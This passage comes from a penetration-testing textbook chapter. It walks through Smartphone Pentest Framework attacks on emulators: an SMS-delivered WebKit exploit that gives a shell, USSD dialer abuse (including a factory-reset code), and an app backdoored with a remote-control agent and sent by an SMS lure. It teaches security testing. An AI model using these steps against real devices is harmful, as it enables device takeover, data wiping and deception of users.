Listing 20-7: Root SSH default password Metasploit module
If you have a jailbroken iPhone handy, you can test this module. Metasploit
will present you with a root shell if the login succeeds. When you are finished,
type exit to close the shell and return to SPF. Of course, if you have SSH on
your iPhone, be sure to change the password from alpine right away.
Client-side attacks
With mobile devices, client-side attacks are more prevalent than remote attacks.
And as with the attacks we studied in Chapter 10, our client-side attacks are
not restricted to the mobile browser. We can attack other default apps on
the device as well as any third-party apps that may have bugs.
Client-Side Shell
Let’s look at an example of attacking the WebKit package in the mobile
browser to gain a shell on an Android device. (This is similar to the browser
attacks discussed in Chapter 10.) We’ll attack a flaw in the mobile browser
after enticing the user into opening a malicious page. The executed shell-
code will be for Android, not Windows, but the overall attack dynamics are
the same, as shown in Listing 20-8.
spf> 6
Choose a social engineering or client side attack to launch:
1.) Direct Download Agent
2.) Client Side Shell
3.) USSD Webpage Attack (Safe)
4 ) USSD Webpage Attack (Malicious)
454 Chapter 20
spf> 2u
Select a Client Side Attack to Run
1) CVE=2010-1759 Webkit Vuln Android
spf> 1v
Hosting Path: /spfbook2w
Filename: /book.htmlx
Delivery Method(SMS or NFC): SMSy
Phone Number to Attack: 15555215558
Custom text(y/N)? N
Listing 20-8: Android browser attack
From the main SPF menu choose 6.) Run a social engineering or client
side attack. Now choose 2.) Client Side Shell u then exploit option 1.)
CVE=2010-1759 Webkit Vuln Android v. You will be prompted for the path on
the web server w and asked for a filename x. SPF will then generate a mali-
cious page to attack the CVE-2010-1759 WebKit vulnerability.
You will then be asked how you want to deliver a link to the malicious
page y. You can use either NFC or SMS. Because our emulator does not
support NFC, we choose SMS. When prompted for the number to attack,
send the SMS to your Android 2.1 emulator. Finally, when asked if you want
to use custom text for the SMS (rather than the default “This is a cool page:
”), change the default to something more creative, or not.
We have only one mobile modem attached to SPF, so SPF automati-
cally uses it to send the SMS message. SPF contacts our SPF app on the
Android 4.3 emulator and instructs it to send a text message to the
Android 2.1 emulator. The SMS received by the Android 2.1 emulator
will be from the Android 4.3 emulator. (Some mobile devices, such as
iPhones, have a flaw in how they implement SMS that allows attackers to
spoof the sender number to make it look like this attack came from any
number they’d like.) The message received is shown here.
15555215554: This is a cool page: http://192.168.20.9/spfbook2/book.html
Like the client-side attacks discussed in Chapter 10, this attack relies on
the user opening the link in a vulnerable mobile browser. Our Android 2.1
emulator browser is vulnerable to the attack, and when you click the link
to open the mobile browser, the browser will attempt to open the page for
30 seconds or so as the attack is running, before crashing. At that point,
you should have a shell waiting for you in SPF. SPF automatically runs the
Android equivalent of whoami when the shell opens.
Because we attacked the browser, we’re running as app_2, the mobile
browser on our emulator. As usual, the shell has all the permissions of the
exploited app, meaning that you can run any commands available to the
browser. For example, enter /system/bin/ls, as shown in Listing 20-9, to use
ls to list the contents of the current directory. When you’ve finished, enter
exit to return to SPF.
Using the Smartphone Pentest Framework 455
Connected: Try exit to quit
uid=10002(app_2) gid=10002(app_2) groups=1015(sdcard_rw),3003(inet)
/system/bin/ls
sqlite_stmt_journals
--snip--
exit
Listing 20-9: Android shell
note Android is a forked Linux kernel, so once we have a shell, we should be ready to
go with Android, right? Unfortunately, many Linux utilities like cp aren’t there.
Additionally, the user structure is a bit different, with each app having its own UID.
A deep dive into Android, however, is beyond the scope of this chapter.
We’ll look at an alternative way to control exploited Android devices,
using backdoored apps to call Android APIs, later in this chapter. But first
let’s look at another client-side attack.
USSD Remote Control
Unstructured Supplementary Service Data (USSD) is a way for mobile devices to
communicate with the mobile network. When you dial specific numbers,
the device will perform certain functions.
In late 2012, it came to light that some Android devices would automati-
cally open a number they discovered on a web page in the dialer application.
When USSD codes are entered in the dialer, the functionality is automati-
cally called. That sounds like a great function for attackers to abuse to con-
trol a device remotely.
As it turned out, attackers could put USSD codes in a web page as the
number to dial and end up forcing these vulnerable devices to do all sorts
of interesting things. For example, as shown here, the tel: tag in a mali-
cious web page tells Android this is a phone number. But when the USSD
code 2673855%23 is opened in the dialer, the device performs a factory
restore, deleting all the user’s data.
note The vulnerability is not in the USSD code itself, but in certain devices’ implementa-
tion of the tel: tag. Various USSD tags offer all sorts of functionality.
Our example will use a more innocuous payload than the one described
previously. We’ll have our device automatically dial a code to present its
unique identifier in a pop-up, as shown in Listing 20-10.
456 Chapter 20
spf> 6
Choose a social engineering or client side attack to launch:
1.) Direct Download Agent
2.) Client Side Shell
3.) USSD Webpage Attack (Safe)
4 ) USSD Webpage Attack (Malicious)
spf> 3u
Hosting Path: /spfbook2
Filename: /book2.html
Phone Number to Attack: 15555215558
Listing 20-10: Android USSD attack
To run the safe USSD example in SPF, choose menu option 6, then
3.) USSD Webpage Attack (Safe) u. You’ll be asked for the location of the web
server, the name of the malicious page, and the phone number to text it to.
Send it to your Android 2.1 emulator.
Now open the page in the SMS you receive on the Android 2.1 emula-
tor. This time, instead of crashing the browser, the dialer app opens, and a
pop-up notification appears, as shown in Figure 20-2.
Figure 20-2: USSD autodial
As it turns out, our emulator has no unique identifier, so the number is
blank. Though this example was not harmful to the device or its data, other
USSD codes can be if they are opened in the dialer.
Using the Smartphone Pentest Framework 457
note Of course, this vulnerability, as well as the WebKit issue we exploited in the previous
section, has been patched since its discovery. Android has a complicated relationship
with security updates. The problem is that anyone can make an Android device with
its own implementation of the Android OS. When Google releases a new version
with a set of patches, every original equipment manufacturer (OEM) needs to port
the changes to its version of Android, and the carriers need to push updates to their
devices. However, updates are not delivered consistently, which means that millions
of unpatched devices may be in use, depending on the model and the carrier.
Now let’s turn our attention to a vulnerability that will probably never
be patched: malicious applications.
malicious apps
We’ve studied malicious programs intermittently throughout this book. We
created malicious executables with Msfvenom in Chapter 4, uploaded back-
doors to vulnerable web servers in Chapter 8, looked at social-engineering
attacks to trick users into downloading and running malicious programs in
Chapter 11, and bypassed antivirus programs in Chapter 12.
While social engineering and users undermining security policies
by running malicious programs will likely be major issues for enterprise
security for years to come, mobile devices make this issue even more com-
plicated. It’s hard to imagine anyone giving you a laptop computer for work
and encouraging you to go out to the Internet and download every poten-
tially interesting, fun, or productivity-increasing program you can find—
but that’s exactly how mobile devices are marketed. (“Buy our device. It has
the best apps.” “Download our apps. They’re the best in productivity/enter-
tainment/security.”) Mobile antivirus applications often require extreme
permissions and even administrative functions on the device in order to
run, and mobile device management solutions typically require installing
even more applications on the device.
Mobile users are inundated with reasons to download apps to their
devices, and mobile malware is on the rise, much of it in the form of mali-
cious applications. If a user can be tricked into installing a malicious app,
the attacker can utilize Android’s APIs to steal data, gain remote control,
and even attack other devices.
In the Android security model, apps must request permissions to use
APIs that could be used maliciously, and users must accept the requested
permissions at installation. Unfortunately, users often grant access to all
sorts of potentially dangerous permissions. We can use Android permis-
sions to control the device without running an additional exploit after the
user installs the malicious app.
458 Chapter 20
Creating Malicious SPF Agents
SPF allows us to create a malicious app with a variety of interesting func-
tionality. Earlier we used the SPF app on our pentester-controlled device to
allow SPF to use the device’s mobile modem and other functionality; our
goal here is to trick users into installing the SPF agent on target devices.
As of this writing, SPF agents can receive commands by checking in to a
web server over HTTP or via hidden SMS messages from an SPF-controlled
mobile modem. Naturally, we’ll be more successful if our agent appears to be
an interesting and/or trustworthy app. We can embed the agent inside any
legitimate app: SPF can take a compiled APK file and backdoor it with the
agent, or if we have the source code of the app, we can backdoor that as well.
Backdooring Source Code
Let’s use backdooring source code for our example. Choose 1.) Attach
Framework to a Deployed Agent/Create Agent at the main SPF menu. SPF
includes a couple of app templates that we can use for our example. You
can also import any app source code into SPF with option 4. If you don’t
have source code for the app you want to impersonate, you can use option 5
to backdoor a compiled APK. You can even use the Android Master Key
vulnerability discovered in 2013 to replace applications already installed
on the device with a backdoored version. For now, let’s just use one of SPF’s
templates, as shown in Listing 20-11.
spf> 1
Select An Option from the Menu:
1.) Attach Framework to a Deployed Agent
2.) Generate Agent App
3.) Copy Agent to Web Server
4.) Import an Agent Template
5.) Backdoor Android APK with Agent
6.) Create APK Signing Key
spf> 2u
1.) MapsDemo
2.) BlankFrontEnd
spf> 1v
Phone number of the control modem for the agent: 15555215554w
Control key for the agent: KEYKEY1x
Webserver control path for agent: /androidagent1y
Control Number:15555215554
Control Key:KEYKEY1
ControlPath:/androidagent1
Is this correct?(y/n) y
--snip--
BUILD SUCCESSFUL
Listing 20-11: Building the Android agent
Using the Smartphone Pentest Framework 459
Choose 2.) Generate Agent App u. We’ll use the MapsDemo example
template v distributed with Android SDK by Google to demonstrate func-
tionality. When prompted, give the phone number to send SMS commands
to w, the SPF the seven-character key x, and the directory to check in for
HTTP commands y. For the agent key and path, use the same values that
you used when you created the SPF app (“Building the Android App” on
page 449). Use the Android 4.3 emulator (SPF app) phone number as
the control phone number. SPF will build the Android agent in the chosen
template.
Now to entice the user into downloading and installing the agent, a
process similar to our client-side attacks, following the steps in Listing 20-12.
spf> 6
Choose a social engineering or client side attack to launch:
1.) Direct Download Agent
2.) Client Side Shell
3.) USSD Webpage Attack (Safe)
4 ) USSD Webpage Attack (Malicious)
spf> 1u
This module sends an SMS with a link to directly download and install an Agent
Deliver Android Agent or Android Meterpreter (Agent/meterpreter:) Agentv
Hosting Path: /spfbook3w
Filename: /maps.apk
Delivery Method:(SMS or NFC): SMS
Phone Number to Attack: 15555215556
Custom text(y/N)? N
Listing 20-12: Enticing the user into installing the agent
Choose option 6 at the main menu,
and then choose 1.) Direct Download Agent
u. You will be asked if you want to send the
Android agent or Android Meterpreter (a
recent addition to Metasploit). Because we’re
working with the Android agent, choose Agent
v. As usual, you are prompted for the path,
app name on the web server, attack vector,
and the number to attack, beginning at w.
Instruct SPF to send an SMS with default
text to the Android 2.2 emulator.
On the Android 2.2 emulator, click the
link in the SMS when it arrives. The app
should be downloaded. After it downloads,
click Install, accept the permissions, and
open the app. As shown in Figure 20-3, the
agent will look and feel like the original app
template (the Google Maps demo), but it has
Figure 20-3: Backdoored app
some extra functionality in the background.
460 Chapter 20
Now to attach SPF to the deployed agent. If you send an SMS campaign
to lots of numbers, who knows how many users will install the agent or how
quickly, but the agent has check-in functionality (see Listing 20-13) that will
respond to SPF’s query to see if it is deployed.
spf> 1
Select An Option from the Menu:
1.) Attach Framework to a Deployed Agent
2.) Generate Agent App
3.) Copy Agent to Web Server
4.) Import an Agent Template
5.) Backdoor Android APK with Agent
6.) Create APK Signing Key
spf> 1u
Attach to a Deployed Agent:
This will set up handlers to control an agent that has already been deployed.
Agent URL Path: /androidagent1v
Agent Control Key: KEYKEY1w
Communication Method(SMS/HTTP): HTTPx
URL Path: /androidagent1
Control Key: KEYKEY1
Communication Method(SMS/HTTP): HTTP
Is this correct?(y/N): y